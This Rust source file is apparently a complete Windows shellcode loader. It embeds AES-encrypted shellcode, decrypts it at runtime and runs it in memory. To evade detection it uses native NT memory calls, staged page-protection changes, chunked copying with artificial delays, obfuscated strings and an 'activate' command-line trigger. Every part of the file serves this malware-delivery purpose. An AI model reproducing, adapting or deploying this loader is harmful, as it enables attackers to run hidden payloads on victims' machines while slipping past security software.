use std::env;
use aes::{Aes128};
use cfb_mode::Cfb;
use cfb_mode::cipher::{NewCipher, AsyncStreamCipher};
use windows::{Win32::System::Memory::*, Win32::System::SystemServices::*};
use ntapi::{ntmmapi::*, ntpsapi::*, ntobapi::*, winapi::ctypes::*};
use obfstr::obfstr;

type Aes128Cfb = Cfb<Aes128>;

pub struct Injector {
    shellcode: Vec<u8>,
}

impl Injector {
    pub fn new(shellcode: Vec<u8>) -> Injector {
        Injector { shellcode }
    }

    pub fn run_in_current_process(&mut self) {
        unsafe {
            let mut protect = PAGE_NOACCESS.0;
            let mut map_ptr: *mut c_void = std::ptr::null_mut();
            // asking for more than needed, because we can afford it
            let mut sc_len = self.shellcode.len() * 100;
            NtAllocateVirtualMemory(NtCurrentProcess, &mut map_ptr, 0, &mut sc_len, MEM_COMMIT.0 | MEM_RESERVE.0, protect);
            custom_sleep(100);
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_READWRITE.0, &mut protect);
            custom_sleep(100);
            self.copy_nonoverlapping_gradually(map_ptr as *mut u8);
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_NOACCESS.0, &mut protect);
            custom_sleep(100);
            NtProtectVirtualMemory(NtCurrentProcess, &mut map_ptr, &mut sc_len, PAGE_EXECUTE.0, &mut protect);
            custom_sleep(100);
            let mut thread_handle : *mut c_void = std::ptr::null_mut();
            NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, std::ptr::null_mut(), NtCurrentProcess, map_ptr, std::ptr::null_mut(), 0, 0, 0, 0, std::ptr::null_mut());
            NtWaitForSingleObject(thread_handle, 0, std::ptr::null_mut());
        }
    }

    fn copy_nonoverlapping_gradually(&mut self, map_ptr: *mut u8) {
        unsafe {
            let sc_ptr = self.shellcode.as_ptr();
            let mut i = 0;
            while i < self.shellcode.len()+33 {
                std::ptr::copy_nonoverlapping(sc_ptr.offset(i as isize), map_ptr.offset(i as isize), 32);
                i += 32;
                #[cfg(debug_assertions)]
                if i % 3200 == 0 || i > self.shellcode.len()
                {
                    println!("{}{}{}{}{}", obfstr!("[+] [total written] ["), i, obfstr!("B/"), self.shellcode.len(), obfstr!("B]"));
                }
                custom_sleep(2);
            }
        }
    }
}

const SHELLCODE_BYTES: &[u8] = include_bytes!("../shellcode.enc");
const SHELLCODE_LENGTH: usize = SHELLCODE_BYTES.len();

#[no_mangle]
#[link_section = ".text"]
static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.enc");
static AES_KEY: [u8; 16] = *include_bytes!("../aes.key");
static AES_IV: [u8; 16] = *include_bytes!("../aes.iv");

fn decrypt_shellcode_stub() -> Vec<u8> {
    let mut cipher = Aes128Cfb::new_from_slices(&AES_KEY, &AES_IV).unwrap();
    let mut buf = SHELLCODE.to_vec();
    cipher.decrypt(&mut buf);
    buf
}

fn custom_sleep(delay: u8) {
    for _ in 0..delay {
        for _ in 0..10 {
            for _ in 0..10 {
                for _ in 0..10 {
                    print!("{}", obfstr!(""));
                }
            }
        }
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args[1] == obfstr!("activate") {
        let mut injector = Injector::new(decrypt_shellcode_stub());
        injector.run_in_current_process();
    }
}
